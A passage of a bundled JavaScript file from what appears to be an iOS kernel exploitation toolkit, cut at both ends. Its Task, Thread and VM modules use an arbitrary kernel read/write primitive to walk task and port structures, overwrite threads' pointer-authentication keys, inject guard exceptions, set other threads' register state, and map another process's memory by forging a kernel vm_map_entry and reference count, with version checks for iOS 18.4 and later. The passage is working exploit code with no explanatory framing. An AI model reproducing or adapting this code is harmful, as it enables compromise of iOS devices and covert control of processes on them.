		return this.#getPortObject(spaceTable, port);
	}

	static getPortKObject(port)
	{
		let portObject = this.getPortAddr(port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static #getPortKObjectByAddr(portObject)
	{
		if (!portObject)
			return 0;
		let kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().objectKObject);
		return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(kobject);
	}

	static firstThread(taskAddr)
	{
		let first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().threads);
		return first;
	}

	static getMap(taskAddr)
	{
		let vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().mapTask);
		return vmMap;
	}

	static getPortKObjectOfTask(taskAddr,port)
	{
		let portObject = this.getPortAddrOfTask(taskAddr, port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static getPortAddrOfTask(taskAddr, port)
	{
		let spaceTable = this.#getSpaceTable(taskAddr);
		return this.#getPortObject(spaceTable, port);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/TaskRop.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/TaskRop.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ TaskRop)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");


const TAG = "TASKROP"

class TaskRop
{
	static init()
	{
		let selfTaskAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].getSelfTaskAddr();
		if (!selfTaskAddr)
		{
			console.log(TAG,`Unable to find self task address`);
			return;
		}	
		console.log(TAG,`selfTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(selfTaskAddr)}`);
		_Task__WEBPACK_IMPORTED_MODULE_2__["default"].init(selfTaskAddr);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Thread.js":
/*!************************************!*\
  !*** ./src/libs/TaskRop/Thread.js ***!
  \************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Thread)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");


const AST_GUARD = 0x1000;
const TAG = "THREAD";
function thrLog(msg) {
	// Quiet by default - thread_get_state kr spam flooded pelog during RC.
	return;
}

class Thread
{
	static getTro(thread)
	{
		let tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().tro);
		// Ignore threads with invalid tro address.
		if (!(tro & 0xf000000000000000n))
		{
			//console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);
			return 0n;
		}
		return tro;
	}
	static getCtid(thread)
	{
		let ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ctid);
		return ctid;
	}
	static getTask(thread)
	{
		let tro = this.getTro(thread);
		// Ignore threads with invalid tro address.
		if (!(tro & 0xf000000000000000n) || tro === 0n)
			return 0n;
		let task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().troTask);
		return task;
	}
	static next(thread)
	{
		if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads) < 0xffffffd000000000n)
			return 0;
		let next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads);
		if (next < 0xffffffd000000000n)
			return 0;
		return next;
	}
	static setMutex(thread,ctid)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData, ctid);
	}
	static getMutex(thread)
	{
		let mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData);
		return mutex;
	}
	static getStack(thread)
	{
		let stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().kstackptr);
		return stackptr;
	}
	static injectGuardException(thread,code)
	{
		if(!this.getTro(thread))
		{
			console.log(TAG,`got invalid tro of thread, not injecting exception since thread is dead`);
			return false;
		}

		// 18.4+
		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0x17n);
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, code);
		}
		else {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, code);
		}

		let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
		ast |= AST_GUARD;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);
		return true;
	}
	static clearGuardException(thread)
	{
		if(!this.getTro(thread))
		{
			console.log(TAG,`got invalid tro of thread, still clearing exception to avoid crash`);
		}
		let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
		ast &= ~AST_GUARD | 0x80000000;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);

		// 18.4+
		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
			if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode) == 0x17n) {
				libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
				libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, 0n);
			}
		}
		else {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
		}
	}
	static getOptions(thread)
	{
		let options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options);
		return options;
	}
	static setOptions(thread, options)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options, options);
	}
	static getRopPid(thread)
	{
		let ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid);
		return ropPid;
	}
	static getJopPid(thread)
	{
		let jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid);
		return jopPid;
	}
	static setPACKeys(thread, keyA, keyB)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid, keyA);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid, keyB);
	}

	static getState(machThread)
	{
		let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
		let stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem + 0x200n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_get_state",
			machThread,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
			statePtr,
			stateCountPtr);
		if (kr != 0) {
			thrLog("thread_get_state FAIL kr=" + kr + " machThread=" +
				libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(machThread));
			return false;
		}

		let stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_SIZE);
		let state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__["default"](stateBuff);
		return state;
	}

	static setState(machThread, threadAddr, state)
	{
		let options = 0;
		if (threadAddr) {
			options = Thread.getOptions(threadAddr);
			options |= 0x8000;
			Thread.setOptions(threadAddr, options);
		}

		let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write(statePtr, state.buffer);
		//console.log(TAG,`thread:${Utils.hex(thread)}`);
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_set_state",
			machThread,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
			statePtr,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
		if (kr != 0)
		{
			thrLog("thread_set_state FAIL kr=" + kr);
			return false;
		}

		if (threadAddr) {
			options &= ~0x8000;
			Thread.setOptions(threadAddr, options);
		}
		return true;
	}

	static resume(machThread)
	{
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_resume", machThread);
		if (kr != 0) {
			thrLog("thread_resume FAIL kr=" + kr);
			return false;
		}
		return true;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/ThreadState.js":
/*!*****************************************!*\
  !*** ./src/libs/TaskRop/ThreadState.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ThreadState)
/* harmony export */ });
/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./RegistersStruct */ "./src/libs/TaskRop/RegistersStruct.js");


class ThreadState
{
	#buffer;
	#dataView;
	constructor(buffer, offset = 0)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(buffer,offset);
		this.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__["default"](buffer,offset);
	}
	get buffer()
	{
		return this.#buffer;
	}
	get opaque_fp()
	{
		return this.#dataView.getBigUint64(232,true);
	}
	set opaque_fp(value)
	{
		this.#dataView.setBigUint64(232,value,true);
	}
	get opaque_lr()
	{
		return this.#dataView.getBigUint64(240,true);
	}
	set opaque_lr(value)
	{
		this.#dataView.setBigUint64(240,value,true);
	}
	get opaque_sp()
	{
		return this.#dataView.getBigUint64(248,true);
	}
	set opaque_sp(value)
	{
		this.#dataView.setBigUint64(248,value,true);
	}
	get opaque_pc()
	{
		return this.#dataView.getBigUint64(256,true);
	}
	set opaque_pc(value)
	{
		this.#dataView.setBigUint64(256,value,true);
	}
	get cpsr()
	{
		return this.#dataView.getUint32(264,true);
	}
	set cpsr(value)
	{
		this.#dataView.setUint32(264,value,true);
	}
	get opaque_flags()
	{
		return this.#dataView.getUint32(268,true);
	}
	set opaque_flags(value)
	{
		this.#dataView.setUint32(268,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VM.js":
/*!********************************!*\
  !*** ./src/libs/TaskRop/VM.js ***!
  \********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VM)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./VmMapEntry */ "./src/libs/TaskRop/VmMapEntry.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _VMObject__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./VMObject */ "./src/libs/TaskRop/VMObject.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
/* harmony import */ var _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./VmPackingParams */ "./src/libs/TaskRop/VmPackingParams.js");


const TAG = "VM";
const VME_ALIAS_BITS = 12n;
const VME_OFFSET_BITS = (64n - VME_ALIAS_BITS);
const VME_OFFSET_SHIFT = VME_ALIAS_BITS;
const VME_SUBMAP_SHIFT = 2n;
const VME_SUBMAP_BITS = (8n * 8n - VME_SUBMAP_SHIFT);
const VM_KERNEL_POINTER_SIGNIFICANT_BITS = 38;
const VM_MAX_KERNEL_ADDRESS = 0xfffffffbffffffffn;
const VM_PAGE_PACKED_PTR_BITS = 31;
const VM_PAGE_PACKED_PTR_SHIFT = 6;
const SIZE_VMOBJECT = 0x20;
const VM_LINK_SIZE = 0x20;
const VM_MAP_ENTRY_SIZE = 0x50;
const VMShmem_SIZE = 0x18;
const VMPackingSize = 0x10;
const VM_FLAGS_ANYWHERE = 0x00000001n;

class VM
{
	static VM_PROT_READ = 1n;
	static VM_PROT_WRITE = 2n;
	static VM_PROT_EXECUTE = 4n;
	static VM_PROT_ALL = (this.VM_PROT_READ|this.VM_PROT_WRITE|this.VM_PROT_EXECUTE);
	static VM_PROT_IS_MASK = 0x40n;
	static VM_INHERIT_NONE = 2n;

	static #Tib(x)
	{
		return ((0n + (x)) << 40n);
	}
	static #Gib(x)
	{
		return ((0n + (x)) << 30n);
	}
	static #VM_MIN_KERNEL_ADDRESS()
	{
		return ((0n - this.#Gib(144n)));
	}
	static #VM_MIN_KERNEL_AND_KEXT_ADDRESS()
	{
		return this.#VM_MIN_KERNEL_ADDRESS();
	}
	static #VM_PAGE_PACKED_PTR_BASE()
	{
		return this.#VM_MIN_KERNEL_AND_KEXT_ADDRESS();
	}
	static #VM_PACKING_IS_BASE_RELATIVE(packed)
	{
		return ((packed.vmpp_bits + packed.vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS);
	}
	static #VM_PACKING_PARAMS(ns)
	{
		ns.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(ns);
		return ns;
	}
	static #VM_UNPACK_POINTER(packed, ns)
	{
		return this.#vm_unpack_pointer(packed,this.#VM_PACKING_PARAMS(ns));
	}
	static #VM_PACK_POINTER(ptr, ns)
	{
		return this.#vm_pack_pointer(ptr, this.#VM_PACKING_PARAMS(ns));
	}
	static #bigUint64ToIntptr(bigUint64) {
		// Create a BigInt mask for the lower 64 bits
		const lower64BitsMask = BigInt("0xFFFFFFFFFFFFFFFF");

		// Apply the mask to ensure the value is within the range of 64 bits
		bigUint64 = bigUint64 & lower64BitsMask;

		// Check if the value is greater than the maximum signed 64-bit integer
		if (bigUint64 > BigInt("0x7FFFFFFFFFFFFFFF")) {
			// Convert to signed by subtracting 2^64
			return Number(bigUint64 - BigInt("0x10000000000000000"));
		} else {
			// Directly convert to Number
			return Number(bigUint64);
		}
	}
	static #vm_unpack_pointer(packed, params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if unpack`);
			//let addr = this.#bigUint64ToIntptr(BigInt(packed));
			let addr = packed;
			addr <<= 64 - params.vmpp_bits;
			addr >>= 64 - params.vmpp_bits - params.vmpp_shift;
			return addr;
		}
		if (packed)
		{
			//console.log(TAG,`In second if unpack`);
			return (BigInt(packed) << BigInt(params.vmpp_shift)) + BigInt(params.vmpp_base);
		}
		return 0n;
	}
	static #vm_pack_pointer(ptr,params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if pack`);
			return ptr >> params.vmpp_shift;
		}
		if (ptr)
		{
			//console.log(TAG,`In second if pack`);
			return (BigInt(ptr) - BigInt(params.vmpp_base)) >> BigInt(params.vmpp_shift);
		}
		return 0n;
	}
	static #VME_OFFSET(entry)
	{
		return entry.vme_offset << 12n;
	}
	static #trunc_page_kernel(x)
	{
		//return ((x) & (~vm_kernel_page_mask));
		return ((x) & (~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK));
	}
	static #round_page_kernel(x)
	{
		//return this.#trunc_page_kernel((x) + vm_kernel_page_mask);
		return this.#trunc_page_kernel((x) + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK);
	}
	static #vm_getEntry(map,address)
	{
		let rbhRoot = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(map + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().hdrRBHRoot);
		
		//console.log(TAG,`Get entry:${Utils.hex(address)}`);
		//console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);
	
		let rbEntry = rbhRoot;
		let foundEntry = 0n;
	
		while (rbEntry != 0n)
		{
			let curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
			//uint64_t prev = 0;
	
			let links = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read(curPtr, links, VM_LINK_SIZE);
			let linksBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(links,VM_LINK_SIZE);
			let linksArray = new Uint8Array(linksBuffer);
			links = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_links(linksArray);
	
			//console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);
	
			if (address >= links.start)
			{
				if (address < links.end)
				{
					foundEntry = curPtr;
					//console.log(TAG,`Found:${Utils.hex(curPtr)}`);
					break;
				}
	
				let rbeRight = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeRight);
				rbEntry = rbeRight;
				//prev = curPtr;
			}
			else
			{
				let rbeLeft = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeLeft);
				rbEntry = rbeLeft;
			}
		}
		return foundEntry;
	}

	static mapRemotePage(vmMap, address)
	{
		//console.log(TAG, `Map remote address: ${Utils.hex(address)}`);

		let vmObject = VM.getObject(vmMap, address);
		//LOG("vmObject: %llx (objectOffset=%llx, entryOffset=%llx)",
		//	vmObject.address,
		//	vmObject.objectOffset,
		//	vmObject.entryOffset);
		
		if (!vmObject.address)
			return null;

		let shmem = VM.createShmemWithVmObject(vmObject);
		//LOG("shmem: port=%x, address=%llx", shmem.port, shmem.remoteAddress);

		return shmem;
	}

	static getObject(map, address)
	{
		let VMObjectBuff = new ArrayBuffer(SIZE_VMOBJECT);
		let vmObject = new _VMObject__WEBPACK_IMPORTED_MODULE_5__["default"](VMObjectBuff);
		let entryAddr = this.#vm_getEntry(map, address);
		if (!entryAddr)
			return vmObject;

		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(entryAddr, VM_MAP_ENTRY_SIZE);
		let entryUintArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryUintArr);
		//console.log(TAG, `entry: addr=${Utils.hex(entryAddr)}, is_sub_map=${entry.is_sub_map}, vme_object_packed=${Utils.hex(entry.vme_object)}`);

		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(entry.vme_object, params);
		//console.log(TAG, `vme object: ${Utils.hex(vmeObject)}`);

		let objectOffs = this.#VME_OFFSET(entry);
		let entryOffs = address - entry.links.start + objectOffs;
		
		//console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
		//console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);

		vmObject.vmAddress = address;
		vmObject.address = BigInt(vmeObject);
		vmObject.objectOffset = BigInt(objectOffs);
		vmObject.entryOffset = BigInt(entryOffs);
		return vmObject;
	}

	static createShmemWithVmObject(object)
	{
		//console.log(TAG,`Inside createShmem with addr to read:${Utils.hex(object.address)}`);
		let shmemBuff = new ArrayBuffer(VMShmem_SIZE);
		let shmem = new _VMShmem__WEBPACK_IMPORTED_MODULE_6__["default"](shmemBuff);
		let size = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().vouSize);
		size = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].round_page(size);
		
		//console.log(TAG,`vm object size:${Utils.hex(size)}`);
		
		let localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let roundedSize = this.#round_page_kernel(size);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_allocate",0x203n, localAddr, roundedSize, VM_FLAGS_ANYWHERE);
		if (ret != 0)
		{
			console.log(TAG,`mach_vm_allocate():${ret}`);
			return shmem;
		}
		localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(localAddr);
		//console.log(TAG,`mach_vm_allocate:${Utils.hex(roundedSize)} localAddr:${Utils.hex(localAddr)}`);
		/*
		let memory_object = new_bigint();
		ret = Native.callSymbol("mach_make_memory_entry_64",
			0x203n,
			get_bigint_addr(roundedSize),
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			get_bigint_addr(memory_object),
			0n);
		let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
		let resView = new DataView(resBuff);
		let port = resView.getUint32(0,true);
		*/
		
		let memory_object = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x500n;
		let roundedSizePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x1000n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(roundedSizePtr, roundedSize);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_make_memory_entry_64",
			0x203n,
			roundedSizePtr,
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			memory_object,
			0n);
		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read32(memory_object);
		//let port = Native.callSymbol("wrapper_mach_make_memory_entry_64",roundedSize,localAddr);
		//console.log(TAG,`mach_make_memory_entry_64():${Utils.hex(port)}`);
		let shmemNamedEntry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortKObject(BigInt(port));
		//console.log(TAG,`shmem named entry:${Utils.hex(shmemNamedEntry)}`);
		let shmemVMCopyAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemNamedEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().backingCopy);
		//console.log(TAG,`shmem named entry VM copy addr:${Utils.hex(shmemVMCopyAddr)}`);
		let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemVMCopyAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().next);
		//console.log(TAG,`next addr:${Utils.hex(nextAddr)}`);
		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(nextAddr, VM_MAP_ENTRY_SIZE);
		let entryArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryArr);
		//console.log(TAG,`entry: vme_kernel_object=${Utils.hex(entry.vme_kernel_object)}, is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		//console.log(TAG,`entry: is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		if (entry.vme_kernel_object || entry.is_sub_map || false) // vme_kernel_object struct is not implemented
		{
			console.log(TAG,`Entry cannot be a submap`);
			return shmem;
		}
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let packedPointer = this.#VM_PACK_POINTER(object.address, params);
		//console.log(TAG,`packedPointer:${Utils.hex(packedPointer)}`);
		let refCount = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount);
		//console.log(TAG,`vm object ref count:${Utils.hex(refCount)}`);
		refCount++;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount, refCount);
		entry.vme_object = Number(packedPointer);
		entry.vme_offset = object.objectOffset;
		//write(nextAddr, &entry, sizeof(entry));
		// write dedicate write in order to avoid zone panic with bigger 0x20 elements size
		let entryResWrite = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(entryResWrite,entryArr.buffer);
		//Utils.printArrayBufferInChunks(entryArr.buffer);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].writeZoneElement(nextAddr, entryResWrite, VM_MAP_ENTRY_SIZE);
